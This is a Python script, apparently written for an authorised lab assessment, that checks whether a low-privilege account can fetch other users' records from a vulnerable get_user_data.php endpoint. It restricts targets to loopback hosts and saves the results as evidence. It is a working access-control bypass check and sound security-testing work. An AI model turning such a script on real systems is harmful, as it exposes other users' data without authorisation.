#!/usr/bin/env python3
# AUTH-001 F02 draft: read-only authorisation check for get_user_data.php.
# Authorised local lab only. Loopback targets only, no redirect following,
# credentials from a local file, nothing sensitive is printed.
import argparse
import http.cookiejar
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise urllib.error.HTTPError(req.full_url, code, "redirect refused: %s" % newurl, headers, fp)


def build_opener():
    jar = http.cookiejar.CookieJar()
    return jar, urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def normalise_base(base):
    parts = urllib.parse.urlsplit(base)
    if parts.scheme not in ("http", "https"):
        raise SystemExit("--base must start with http:// or https://")
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit("only localhost/127.0.0.1/::1 are authorised, got %r" % (parts.hostname,))
    return base.rstrip("/")


def read_secret(path):
    with open(path, "r", encoding="utf-8") as handle:
        value = handle.read().strip()
    if not value:
        raise SystemExit("secret file %s is empty" % path)
    return value


def set_level_cookie(jar, base, level):
    # Same cookie the application's security selector writes.
    host = urllib.parse.urlsplit(base).hostname
    jar.set_cookie(http.cookiejar.Cookie(
        version=0, name="security", value=level, port=None, port_specified=False,
        domain=host, domain_specified=False, domain_initial_dot=False,
        path="/", path_specified=True, secure=False, expires=None, discard=True,
        comment=None, comment_url=None, rest={}, rfc2109=False))


def login(jar, opener, base, username, password):
    body = urllib.parse.urlencode(
        {"username": username, "password": password, "Login": "Login"}).encode("utf-8")
    request = urllib.request.Request(base + "/login.php", data=body, method="POST")
    request.add_header("Content-Type", "application/x-www-form-urlencoded")
    with opener.open(request, timeout=10) as response:
        return response.status


def fetch_users(opener, base):
    request = urllib.request.Request(base + "/vulnerabilities/authbypass/get_user_data.php")
    request.add_header("Accept", "application/json")
    with opener.open(request, timeout=10) as response:
        return response.status, response.read().decode("utf-8", "replace")


def classify(status, text):
    try:
        payload = json.loads(text)
    except ValueError:
        return {"kind": "not-json", "status": status, "snippet": text[:200]}
    if isinstance(payload, dict):
        return {"kind": "json-object", "status": status, "payload": payload,
                "access_denied": payload.get("error") == "Access denied"}
    rows = [row for row in payload if isinstance(row, dict)]
    return {"kind": "json-list", "status": status, "row_count": len(rows),
            "user_ids": [row.get("user_id") for row in rows]}


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", required=True, help="e.g. http://127.0.0.1:8080")
    parser.add_argument("--user", required=True, help="low-privilege dedicated lab account")
    parser.add_argument("--password-file", required=True, help="local file with that account password")
    parser.add_argument("--security", default="low", choices=["low", "medium", "high", "impossible"])
    parser.add_argument("--control-user", default=None, help="optional admin account for the minimal normal request")
    parser.add_argument("--control-password-file", default=None)
    parser.add_argument("--out", default="auth001_f02_evidence.json")
    args = parser.parse_args()

    base = normalise_base(args.base)
    password = read_secret(args.password_file)

    jar, opener = build_opener()
    try:
        login(jar, opener, base, args.user, password)
    except urllib.error.HTTPError as exc:
        print("login failed: HTTP %s" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error during login: %s" % exc.reason)
        return 2
    set_level_cookie(jar, base, args.security)

    try:
        status, text = fetch_users(opener, base)
    except urllib.error.HTTPError as exc:
        print("request failed: HTTP %s" % exc.code)
        return 2
    except urllib.error.URLError as exc:
        print("connection error: %s" % exc.reason)
        return 2

    observed = classify(status, text)
    print("low_privilege: status=%s kind=%s" % (status, observed["kind"]))
    if observed["kind"] == "json-list":
        print("low_privilege: rows=%d user_ids=%s" % (observed["row_count"], observed["user_ids"]))

    control = None
    if args.control_user and args.control_password_file:
        control_password = read_secret(args.control_password_file)
        control_jar, control_opener = build_opener()
        try:
            login(control_jar, control_opener, base, args.control_user, control_password)
            set_level_cookie(control_jar, base, args.security)
            control_status, control_text = fetch_users(control_opener, base)
            control = classify(control_status, control_text)
            print("control: status=%s kind=%s" % (control_status, control["kind"]))
            if control["kind"] == "json-list":
                print("control: rows=%d" % control["row_count"])
        except (urllib.error.HTTPError, urllib.error.URLError) as exc:
            print("control request failed, continuing: %s" % exc)

    evidence = {
        "target": base,
        "security": args.security,
        "low_privilege": observed,
        "control": control,
    }
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(evidence, handle, ensure_ascii=False, indent=2)
    print("evidence=%s" % args.out)

    if observed["kind"] == "json-list" and observed["row_count"] >= 2:
        print("RESULT: the endpoint returned other users' records to this principal")
        return 0
    if observed.get("access_denied"):
        print("RESULT: access denied for this principal under this condition")
        return 1
    print("RESULT: no list of user records observed; inspect the saved evidence")
    return 1


if __name__ == "__main__":
    sys.exit(main())
